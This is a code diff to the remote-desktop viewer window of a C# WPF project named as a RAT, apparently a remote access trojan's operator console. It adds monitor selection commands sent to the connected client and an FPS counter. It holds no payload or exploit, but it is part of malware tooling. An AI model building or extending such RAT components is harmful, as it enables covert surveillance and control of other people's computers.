@@ -28,6 +28,9 @@ namespace ArkerRatWpfVersion
         public RemoteDesktopWindow(RATHostSession session)
         {
             InitializeComponent();
+            ScreenList.Items.Add("none");
+            ScreenList.SelectedItem = ScreenList.Items[0];
+            ScreenList.SelectionChanged += SendSelectedScreen;
 
 
             clientSession = session;
@@ -128,6 +131,33 @@ GlobalVariables.byteSize = 262144;
             this.WindowState = WindowState.Minimized;
         }
 
+        public void AddScreens(string screens)
+        {
+            screens = screens.Replace("§screen§", string.Empty);
+
+            if(screens == "none")
+            {
+                frameQue = new ConcurrentQueue<string>();
+                lock (GlobalVariables._lock)
+                {
+                    clientSession.data = "§PingStart§§PingEnd§";
+                }
+                Application.Current.Dispatcher.InvokeAsync(() => remoteDesktopVideoFrame.Source =null);
+                return;
+            }
+
+            string[] screenArray = screens.Split('|');
+            foreach (string screen in screenArray)
+            {
+                Application.Current.Dispatcher.InvokeAsync(() => ScreenList.Items.Add(screen));
+            }
+        }
+
+        private async void SendSelectedScreen(object sender, SelectionChangedEventArgs e)
+        {
+           await clientSession.SendData("§RemoteDesktopStart§§screen§"+((ComboBox)sender).SelectedItem.ToString()+ "§RemoteDesktopEnd§");
+        }
+
         private async void ImageControl_PreviewMouseDown(object sender, MouseButtonEventArgs e)
         {
             if(!mouseInput)
@@ -159,7 +189,12 @@ GlobalVariables.byteSize = 262144;
 
         private async void FrameBuffer()
         {
-               while (!clientSession.source.IsCancellationRequested && clientSession.remoteDesktopWindowIsAlreadyOpen)
+
+            System.Timers.Timer timer = new System.Timers.Timer(1000);
+            timer.Interval = 1000;
+            timer.Elapsed += FPSCalculator;
+            timer.Enabled=true;
+            while (!clientSession.source.IsCancellationRequested && clientSession.remoteDesktopWindowIsAlreadyOpen)
                {
                    string temp = string.Empty;
                    frameQue.TryDequeue(out temp);
@@ -170,7 +205,11 @@ GlobalVariables.byteSize = 262144;
                            ReceiveFrameChunk(temp);
                    }
             }
+
+            timer.Dispose();
         }
+
+        int frameCounter=0;
 
         private MemoryStream _frameStream = new MemoryStream();
         public async void ReceiveFrameChunk(string frameChunk)
@@ -182,8 +221,8 @@ GlobalVariables.byteSize = 262144;
 
                 await Application.Current.Dispatcher.InvokeAsync(() =>
                 {
-                    try
-                    {
+                    //try
+                    //{
                         BitmapImage bitmapImage = new BitmapImage();
                         bitmapImage.BeginInit();
                         bitmapImage.CacheOption = BitmapCacheOption.OnLoad;
@@ -191,8 +230,10 @@ GlobalVariables.byteSize = 262144;
                         bitmapImage.EndInit();
 
                         remoteDesktopVideoFrame.Source = bitmapImage;
-                    }
-                    catch (Exception ex) { }
+
+                        frameCounter++;
+                    //}
+                    //catch (Exception ex) { }
                 });
             }
             else
@@ -205,6 +246,16 @@ GlobalVariables.byteSize = 262144;
                 }
                 catch (Exception ex) { return; }
             }
+        }
+
+        private void FPSCalculator(object sender, EventArgs e)
+        {
+            Task.Run(() =>
+            {
+                Application.Current.Dispatcher.Invoke(() => FPSLabel.Content = "FPS:" + frameCounter);
+                frameCounter = 0;
+            });
+                
         }
      
         private byte[] CombineFrameChunks()
